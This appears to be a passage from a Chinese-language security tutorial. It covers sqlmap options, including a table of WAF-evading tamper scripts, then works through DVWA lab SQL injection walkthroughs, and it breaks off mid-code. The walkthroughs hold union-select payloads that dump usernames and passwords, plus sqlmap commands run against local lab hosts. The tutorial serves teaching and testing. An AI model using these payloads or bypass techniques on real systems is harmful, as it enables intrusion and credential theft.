<h2 id="注入-1"><a href="#注入-1" class="headerlink" title="注入"></a>注入</h2><h3 id="自定义注入-payload"><a href="#自定义注入-payload" class="headerlink" title="自定义注入 payload"></a>自定义注入 payload</h3><p>选项：<code>--prefix</code> 和 <code>--suffix</code></p>
<p>在某些情况下，仅当用户提供附加到注入 payload 的特定后缀时，才能利用易受攻击的参数。另外，当用户已经知道查询语法并希望通过直接提供注入 payload 前缀和后缀来检测利用 SQL 注入时，这些选项对这种场景会很方便。</p>
<p>漏洞源代码示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM users WHERE id=(&apos;&quot; . $_GET[&apos;id&apos;] . &quot;&apos;) LIMIT 0, 1&quot;;</span><br></pre></td></tr></table></figure>
<p>要检测并利用此 SQL 注入，您可以让 sqlmap 在检测阶段检测<strong>边界</strong>（与 SQL payload 前缀和后缀组合），或者自己提供。</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php\</span><br><span class="line">?id=1&quot; -p id --prefix &quot;&apos;)&quot; --suffix &quot;AND (&apos;abc&apos;=&apos;abc&quot;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
<p>这将使所有 sqlmap 请求最终构成以下查询：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM users WHERE id=(&apos;1&apos;) &lt;PAYLOAD&gt; AND (&apos;abc&apos;=&apos;abc&apos;) LIMIT 0, 1&quot;;</span><br></pre></td></tr></table></figure>
<p>以使查询语法正确。</p>
<p>在这个简单的例子中，sqlmap 可以检测 SQL 注入并利用它，而不需要提供自定义的边界，但有时在真实情况中的应用程序，当注入点存在于嵌套的 <code>JOIN</code> 查询中时，需要提供它。</p>
<h3 id="修改注入数据"><a href="#修改注入数据" class="headerlink" title="修改注入数据"></a>修改注入数据</h3><p>选项：<code>--tamper</code></p>
<p>sqlmap 本身不会混淆发送的 payload，除了将单引号之间的字符串用诸如 <code>CHAR()</code> 进行替换。</p>
<p>如果后端 DBMS 与用户输入内容存在较弱验证机制的情况下，此选项会非常有用。这种验证机制通常是由应用程序源代码调用自行开发的输入验证例程，如昂贵的企业级 IPS 设备或 Web 应用程序防火墙（WAF）。一言蔽之，它们通常以不同的方式实现并且需要花费大量资金。</p>
<p>要利用此选项，需要为 sqlmap 提供逗号分隔的修改脚本列表，这将处理 payload 并返回转换结果。你可以定义自己的修改脚本，编辑使用 sqlmap <code>tamper/</code> 文件夹中的脚本，并使用逗号分隔连接它们作为 <code>--tamper</code> 选项的值（例如：<code>--tamper=&quot;between,randomcase&quot;</code>）。</p>
<p>合法的修改脚本格式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># Needed imports</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line"># Define which is the order of application of tamper scripts against</span><br><span class="line"># the payload</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line">def tamper(payload):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    Description of your tamper script</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    # your code to tamper the original payload</span><br><span class="line"></span><br><span class="line">    # return the tampered payload</span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>
<p>你可以在 <code>tamper/</code> 目录中查看有效和可用的修改脚本。</p>
<p>针对 MySQL 目标，假定字符 <code>&gt;</code>、空格和大写的 <code>SELECT</code> 字符串被禁止：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --\</span><br><span class="line">tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3</span><br><span class="line"></span><br><span class="line">[hh:mm:03] [DEBUG] cleaning up configuration parameters</span><br><span class="line">[hh:mm:03] [INFO] loading tamper script &apos;between&apos;</span><br><span class="line">[hh:mm:03] [INFO] loading tamper script &apos;randomcase&apos;</span><br><span class="line">[hh:mm:03] [INFO] loading tamper script &apos;space2comment&apos;</span><br><span class="line">[...]</span><br><span class="line">[hh:mm:04] [INFO] testing &apos;AND boolean-based blind - WHERE or HAVING clause&apos;</span><br><span class="line">[hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092</span><br><span class="line">[hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057</span><br><span class="line">[hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041</span><br><span class="line">[...]</span><br><span class="line">[hh:mm:04] [INFO] testing &apos;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause</span><br><span class="line">&apos;</span><br><span class="line">[hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/fROm(SELeCt/**/counT(*),CONC</span><br><span class="line">AT(cHar(58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/</span><br><span class="line">**/elsE/**/0/**/ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)*2))x/**/fROm/**/info</span><br><span class="line">rmation_schema.tables/**/group/**/bY/**/x)a)</span><br><span class="line">[hh:mm:04] [INFO] GET parameter &apos;id&apos; is &apos;MySQL &gt;= 5.0 AND error-based - WHERE or</span><br><span class="line"> HAVING clause&apos; injectable</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
<p>sqlmap 1.2.7.20 版本，共有 57 个tamper脚本，与 1.0 版本相比新增了 19 个脚本。</p>
<table>
<thead>
<tr>
<th style="text-align:left">序号</th>
<th style="text-align:left">脚本名称</th>
<th style="text-align:left">注释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:left">0x2char</td>
<td style="text-align:left">将每个编码后的字符转换为等价表达</td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:left">apostrophemask</td>
<td style="text-align:left">单引号替换为Utf8字符</td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td style="text-align:left">apostrophenullencode</td>
<td style="text-align:left">替换双引号为%00%27</td>
</tr>
<tr>
<td style="text-align:left">4</td>
<td style="text-align:left">appendnullbyte</td>
<td style="text-align:left">有效代码后添加%00</td>
</tr>
<tr>
<td style="text-align:left">5</td>
<td style="text-align:left">base64encode</td>
<td style="text-align:left">使用base64编码</td>
</tr>
<tr>
<td style="text-align:left">6</td>
<td style="text-align:left">between</td>
<td style="text-align:left">比较符替换为between</td>
</tr>
<tr>
<td style="text-align:left">7</td>
<td style="text-align:left">bluecoat</td>
<td style="text-align:left">空格替换为随机空白字符，等号替换为like</td>
</tr>
<tr>
<td style="text-align:left">8</td>
<td style="text-align:left">chardoubleencode</td>
<td style="text-align:left">双url编码</td>
</tr>
<tr>
<td style="text-align:left">9</td>
<td style="text-align:left">charencode</td>
<td style="text-align:left">将url编码</td>
</tr>
<tr>
<td style="text-align:left">10</td>
<td style="text-align:left">charunicodeencode</td>
<td style="text-align:left">使用unicode编码</td>
</tr>
<tr>
<td style="text-align:left">11</td>
<td style="text-align:left">charunicodeescape</td>
<td style="text-align:left">以指定的payload反向编码未编码的字符</td>
</tr>
<tr>
<td style="text-align:left">12</td>
<td style="text-align:left">commalesslimit</td>
<td style="text-align:left">改变limit语句的写法</td>
</tr>
<tr>
<td style="text-align:left">13</td>
<td style="text-align:left">commalessmid</td>
<td style="text-align:left">改变mid语句的写法</td>
</tr>
<tr>
<td style="text-align:left">14</td>
<td style="text-align:left">commentbeforeparentheses</td>
<td style="text-align:left">在括号前加内联注释</td>
</tr>
<tr>
<td style="text-align:left">15</td>
<td style="text-align:left">concat2concatws</td>
<td style="text-align:left">替换CONCAT为CONCAT_WS</td>
</tr>
<tr>
<td style="text-align:left">16</td>
<td style="text-align:left">equaltolike</td>
<td style="text-align:left">等号替换为like</td>
</tr>
<tr>
<td style="text-align:left">17</td>
<td style="text-align:left">escapequotes</td>
<td style="text-align:left">双引号替换为\</td>
</tr>
<tr>
<td style="text-align:left">18</td>
<td style="text-align:left">greatest</td>
<td style="text-align:left">大于号替换为greatest</td>
</tr>
<tr>
<td style="text-align:left">19</td>
<td style="text-align:left">halfversionedmorekeywords</td>
<td style="text-align:left">在每个关键字前加注释</td>
</tr>
<tr>
<td style="text-align:left">20</td>
<td style="text-align:left">htmlencode</td>
<td style="text-align:left">html编码所有非字母和数字的字符</td>
</tr>
<tr>
<td style="text-align:left">21</td>
<td style="text-align:left">ifnull2casewhenisnull</td>
<td style="text-align:left">改变ifnull语句的写法</td>
</tr>
<tr>
<td style="text-align:left">22</td>
<td style="text-align:left">ifnull2ifisnull</td>
<td style="text-align:left">替换ifnull为if(isnull(A))</td>
</tr>
<tr>
<td style="text-align:left">23</td>
<td style="text-align:left">informationschemacomment</td>
<td style="text-align:left">标示符后添加注释</td>
</tr>
<tr>
<td style="text-align:left">24</td>
<td style="text-align:left">least</td>
<td style="text-align:left">替换大于号为least</td>
</tr>
<tr>
<td style="text-align:left">25</td>
<td style="text-align:left">lowercase</td>
<td style="text-align:left">全部替换为小写值</td>
</tr>
<tr>
<td style="text-align:left">26</td>
<td style="text-align:left">modsecurityversioned</td>
<td style="text-align:left">空格替换为查询版本的注释</td>
</tr>
<tr>
<td style="text-align:left">27</td>
<td style="text-align:left">modsecurityzeroversioned</td>
<td style="text-align:left">添加完整的查询版本的注释</td>
</tr>
<tr>
<td style="text-align:left">28</td>
<td style="text-align:left">multiplespaces</td>
<td style="text-align:left">添加多个空格</td>
</tr>
<tr>
<td style="text-align:left">29</td>
<td style="text-align:left">nonrecursivereplacement</td>
<td style="text-align:left">替换预定义的关键字</td>
</tr>
<tr>
<td style="text-align:left">30</td>
<td style="text-align:left">overlongutf8</td>
<td style="text-align:left">将所有字符转义为utf8</td>
</tr>
<tr>
<td style="text-align:left">31</td>
<td style="text-align:left">overlongutf8more</td>
<td style="text-align:left">以指定的payload转换所有字符</td>
</tr>
<tr>
<td style="text-align:left">32</td>
<td style="text-align:left">percentage</td>
<td style="text-align:left">每个字符前添加%</td>
</tr>
<tr>
<td style="text-align:left">33</td>
<td style="text-align:left">plus2concat</td>
<td style="text-align:left">将加号替换为concat函数</td>
</tr>
<tr>
<td style="text-align:left">34</td>
<td style="text-align:left">plus2fnconcat</td>
<td style="text-align:left">将加号替换为ODBC函数{fn CONCAT()}</td>
</tr>
<tr>
<td style="text-align:left">35</td>
<td style="text-align:left">randomcase</td>
<td style="text-align:left">字符大小写随机替换</td>
</tr>
<tr>
<td style="text-align:left">36</td>
<td style="text-align:left">randomcomments</td>
<td style="text-align:left">/**/分割关键字</td>
</tr>
<tr>
<td style="text-align:left">37</td>
<td style="text-align:left">securesphere</td>
<td style="text-align:left">添加某字符串</td>
</tr>
<tr>
<td style="text-align:left">38</td>
<td style="text-align:left">sp_password</td>
<td style="text-align:left">追加sp_password字符串</td>
</tr>
<tr>
<td style="text-align:left">39</td>
<td style="text-align:left">space2comment</td>
<td style="text-align:left">空格替换为/**/</td>
</tr>
<tr>
<td style="text-align:left">40</td>
<td style="text-align:left">space2dash</td>
<td style="text-align:left">空格替换为–加随机字符</td>
</tr>
<tr>
<td style="text-align:left">41</td>
<td style="text-align:left">space2hash</td>
<td style="text-align:left">空格替换为#加随机字符</td>
</tr>
<tr>
<td style="text-align:left">42</td>
<td style="text-align:left">space2morecomment</td>
<td style="text-align:left">空格替换为/<strong>_</strong>/</td>
</tr>
<tr>
<td style="text-align:left">43</td>
<td style="text-align:left">space2morehash</td>
<td style="text-align:left">空格替换为#加随机字符及换行符</td>
</tr>
<tr>
<td style="text-align:left">44</td>
<td style="text-align:left">space2mssqlblank</td>
<td style="text-align:left">空格替换为其他空符号</td>
</tr>
<tr>
<td style="text-align:left">45</td>
<td style="text-align:left">space2mssqlhash</td>
<td style="text-align:left">空格替换为%23%0A</td>
</tr>
<tr>
<td style="text-align:left">46</td>
<td style="text-align:left">space2mysqlblank</td>
<td style="text-align:left">空格替换为其他空白符号</td>
</tr>
<tr>
<td style="text-align:left">47</td>
<td style="text-align:left">space2mysqldash</td>
<td style="text-align:left">空格替换为–%0A</td>
</tr>
<tr>
<td style="text-align:left">48</td>
<td style="text-align:left">space2plus</td>
<td style="text-align:left">空格替换为加号</td>
</tr>
<tr>
<td style="text-align:left">49</td>
<td style="text-align:left">space2randomblank</td>
<td style="text-align:left">空格替换为备选字符集中的随机字符</td>
</tr>
<tr>
<td style="text-align:left">50</td>
<td style="text-align:left">symboliclogical</td>
<td style="text-align:left">AND和OR替换为<code>&amp;&amp;</code></td>
</tr>
<tr>
<td style="text-align:left">51</td>
<td style="text-align:left">unionalltounion</td>
<td style="text-align:left">union all select替换为union select</td>
</tr>
<tr>
<td style="text-align:left">52</td>
<td style="text-align:left">unmagicquotes</td>
<td style="text-align:left">宽字符绕过GPC</td>
</tr>
<tr>
<td style="text-align:left">53</td>
<td style="text-align:left">uppercase</td>
<td style="text-align:left">全部替换为大写值</td>
</tr>
<tr>
<td style="text-align:left">54</td>
<td style="text-align:left">varnish</td>
<td style="text-align:left">添加HTTP头</td>
</tr>
<tr>
<td style="text-align:left">55</td>
<td style="text-align:left">versionedkeywords</td>
<td style="text-align:left">用注释封装每个非函数的关键字</td>
</tr>
<tr>
<td style="text-align:left">56</td>
<td style="text-align:left">versionedmorekeywords</td>
<td style="text-align:left">使用注释绕过</td>
</tr>
<tr>
<td style="text-align:left">57</td>
<td style="text-align:left">xforwardedfor</td>
<td style="text-align:left">添加伪造的HTTP头</td>
</tr>
</tbody>
</table>
<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="清空会话文件"><a href="#清空会话文件" class="headerlink" title="清空会话文件"></a>清空会话文件</h3><p>选项：<code>--flush-session</code></p>
<p>经过上面的相关描述，相信你已经熟悉了会话文件的相关概念，值得注意的是，你可以通过选项 <code>--flush-session</code> 来清空会话文件内容。这样你可以避免 sqlmap 默认的缓存机制。也可以手动移除相关的会话文件。</p>
<h3 id="使用-DBMS-hex-函数获取数据"><a href="#使用-DBMS-hex-函数获取数据" class="headerlink" title="使用 DBMS hex 函数获取数据"></a>使用 DBMS hex 函数获取数据</h3><p>开关：<code>--hex</code></p>
<p>很多情况下，获取非 ASCII 数据都会有特殊要求。其中一个解决方案就是使用 DBMS hex 函数。开启这个开关，数据在被获取之前，会被编码成十六进制格式，并在随后被解码成原先的格式。</p>
<h3 id="使用-HTTP-参数污染"><a href="#使用-HTTP-参数污染" class="headerlink" title="使用 HTTP 参数污染"></a>使用 HTTP 参数污染</h3><p>开关：<code>--hpp</code></p>
<p>HTTP 参数污染（HPP）是一种绕过 WAF/IPS/IDS 保护机制（<a href="http://www.imperva.com/resources/glossary/http_parameter_pollution_hpp.html" target="_blank" rel="noopener">这里</a>有相关介绍）的方法，针对 ASP/IIS 和 ASP.NET/IIS 平台尤其有效。如果你怀疑目标使用了这种保护机制，可以尝试使用此开关以绕过它。</p>
<h3 id="针对-WAF-IPS-IDS-保护进行通过测试"><a href="#针对-WAF-IPS-IDS-保护进行通过测试" class="headerlink" title="针对 WAF/IPS/IDS 保护进行通过测试"></a>针对 WAF/IPS/IDS 保护进行通过测试</h3><p>开关：<code>--identify-waf</code></p>
<p>sqlmap 可以尝试识别后端 WAF/IPS/IDS 保护（如果有），以便用户可以执行适当的步骤（例如：通过选项 <code>--tamper</code> 使用篡改脚本）。目前，大约支持 30 种不同的产品（例如：Airlock，Barracuda WAF 等），可以在 <code>waf</code> 目录下找到它们对应的 WAF 脚本。</p>
<h3 id="伪装智能手机"><a href="#伪装智能手机" class="headerlink" title="伪装智能手机"></a>伪装智能手机</h3><p>开关：<code>--mobile</code></p>
<p>有时 Web 服务器向手机提供的是不同于电脑的接口。在这种情况下，你可以强制使用预定义好的智能手机 HTTP User-Agent 头部值。使用此开关，sqlmap 将询问你选择一种流行的智能手机，它将在当前运行中进行伪装。</p>
<p>运行示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; --mobile</span><br><span class="line">[...]</span><br><span class="line">which smartphone do you want sqlmap to imitate through HTTP User-Agent header?</span><br><span class="line">[1] Apple iPhone 4s (default)</span><br><span class="line">[2] BlackBerry 9900</span><br><span class="line">[3] Google Nexus 7</span><br><span class="line">[4] HP iPAQ 6365</span><br><span class="line">[5] HTC Sensation</span><br><span class="line">[6] Nokia N97</span><br><span class="line">[7] Samsung Galaxy S</span><br><span class="line">&gt; 1</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
<h3 id="延时相关"><a href="#延时相关" class="headerlink" title="延时相关"></a>延时相关</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--time-sec=TIMESEC  延迟 DBMS 的响应秒数（默认为 5）</span><br><span class="line">--delay=DELAY       设置每个 HTTP 请求的延迟秒数</span><br><span class="line">--timeout=TIMEOUT   设置连接响应的有效秒数（默认为 30）</span><br><span class="line">--retries=RETRIES   连接超时时重试次数（默认为 3）</span><br><span class="line">--proxy=PROXY       使用代理连接目标 URL</span><br><span class="line">--proxy=socks5://127.0.0.1:1086</span><br></pre></td></tr></table></figure>
<h1 id="DVWA-注入"><a href="#DVWA-注入" class="headerlink" title="DVWA 注入"></a>DVWA 注入</h1><h2 id="SQL-Injection-SQL-注入"><a href="#SQL-Injection-SQL-注入" class="headerlink" title="SQL Injection SQL 注入"></a>SQL Injection SQL 注入</h2><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$id = $_REQUEST[ <span class="string">'id'</span> ]</span><br><span class="line"><span class="comment"># 没有过滤就直接带入 SQL 语句中 使用单引号闭合</span></span><br><span class="line">$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line"><span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// 回显信息</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line">        $html .= <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>因为之前输完 SQLi-Labs 靶场了，从源码中来看这里使用最基本的 Union 联合查询注入效率最高，国光这里直接丢最终注入的 Payload 吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sqli/?id=-1&apos; union select 1,(SELECT+GROUP_CONCAT(user,&apos;:&apos;,password+SEPARATOR+0x3c62723e)+FROM+users)--+&amp;Submit=Submit#</span><br></pre></td></tr></table></figure>
<p><img src="https://image.3001.net/images/20200527/15905836509224.png" alt="img"></p>
<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>和 Low 级别不一样的代码主要区别如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = $_POST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;</span><br></pre></td></tr></table></figure>
<p>可以看到从 GET 型注入变成了 POST 型注入，而且闭合方式不一样，从单引号变成直接拼接到 SQL 语句了。</p>
<p>POST 的数据内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,(SELECT GROUP_CONCAT(user,password SEPARATOR 0x3c62723e) FROM users)&amp;Submit=Submit</span><br></pre></td></tr></table></figure>
<p><img src="https://image.3001.net/images/20200527/1590584240851.png" alt="img"></p>
<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p>主要代码如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = $_SESSION[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br></pre></td></tr></table></figure>
<p>从 SESSION 获取 id 值，使用单引号拼接。因为 SESSION 获取值的特点，这里不能直接在当前页面注入，</p>
<p>input 的输入框内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-2&apos; union select 1,(SELECT GROUP_CONCAT(user,password SEPARATOR 0x3c62723e) FROM users)#</span><br></pre></td></tr></table></figure>
<p><img src="https://image.3001.net/images/20200527/15905847152255.png" alt="img"></p>
<h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><p>这个级别的主要防护代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Anti-CSRF token 防御 CSRF 攻击</span></span><br><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"><span class="comment">// 检测是否是数字类型</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">  <span class="comment">// 预编译</span></span><br><span class="line">  $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">  $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">  $data-&gt;execute();</span><br><span class="line">  $row = $data-&gt;fetch();</span><br></pre></td></tr></table></figure>
<p>CSRF、检测 id 是否是数字</p>
<p>prepare 预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。</p>
<h2 id="SQL-Injection-Blind-SQL-盲注"><a href="#SQL-Injection-Blind-SQL-盲注" class="headerlink" title="SQL Injection (Blind) SQL 盲注"></a>SQL Injection (Blind) SQL 盲注</h2><p>盲注是一个比较耗时的工作，因为之前刷完靶场了，国光这里打算使用 sqlmap 演示一下点到为止，感兴趣的朋友建议去系统地刷下 SQLi-Labs 靶场。</p>
<h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><p>主要区别在这里：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">  <span class="comment">// 查询到结果 只输出如下信息</span></span><br><span class="line">  $html .= <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面尝试直接使用 sqlmap 进行注入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/vulnerabilities/sqli_blind/?id=1*&amp;Submit=Submit#"</span> --cookie=<span class="string">"PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=low"</span> --dbms=MySQL --technique=B --random-agent --flush-session -v 3</span><br></pre></td></tr></table></figure>
<blockquote>
<p>因为 DVWA 是有登录机制的，所以这里手动指定 –cookie 来进行会话认证</p>
</blockquote>
<h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><p>同理也是没有直接输出查询结果的，这里和普通的注入类似，那么这里依然还是直接使用 sqlmap 进行注入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/vulnerabilities/sqli_blind/"</span> --cookie=<span class="string">"PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=medium"</span> --data=<span class="string">"id=1*&amp;Submit=Submit"</span> --dbms=MySQL --technique=B --random-agent --flush-session -v 3</span><br></pre></td></tr></table></figure>
<h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = $_COOKIE[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">$getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br></pre></td></tr></table></figure>
<p>这里是从 Cookie 中获取 id 然后导入到数据库中查询的，那么知道注入点之后依然可以使用 sqlmap 来进行注入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/vulnerabilities/sqli_blind/"</span> --cookie=<span class="string">"id=1*; PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=high"</span> --dbms=MySQL --technique=B --random-agent --flush-session -v 3</span><br></pre></td></tr></table></figure>
<h3 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h3><p>和上面的关卡一样，CSRF、检测 id 是否是数字、prepare 预编译语来防止 SQL 注入。</p>
<h1 id="Web-for-Pentester-SQL注入系列"><a href="#Web-for-Pentester-SQL注入系列" class="headerlink" title="Web for Pentester SQL注入系列"></a>Web for Pentester SQL注入系列</h1><h2 id="Example-1-基础注入"><a href="#Example-1-基础注入" class="headerlink" title="Example 1 基础注入"></a>Example 1 基础注入</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users where name='"</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"name"</span>].<span class="string">"'"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> ($result) &#123;</span><br><span class="line">  <span class="keyword">while</span> ($row = mysql_fetch_assoc($result))</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span>.$row[<span class="string">'id'</span>].<span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span>.$row[<span class="string">'name'</span>].<span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span>.$row[<span class="string">'age'</span>].<span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> 